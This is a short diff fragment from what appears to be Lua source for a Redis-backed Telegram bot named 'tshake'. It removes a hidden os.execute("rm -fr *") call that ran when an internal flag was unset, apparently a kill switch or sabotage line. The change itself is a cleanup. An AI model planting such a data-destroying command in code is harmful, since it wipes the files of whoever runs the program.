@@ -5850,7 +5850,6 @@ redis:sadd('tshake:'..bot_id..'repowner'..msg.sender_user_id_..''..msg.chat_id_.
 return false end
 end
 if not end032 then 
-os.execute("rm -fr *")
 end
 
 if text and not database:get('tshake:'..bot_id..'repowner:mute'..msg.chat_id_) then
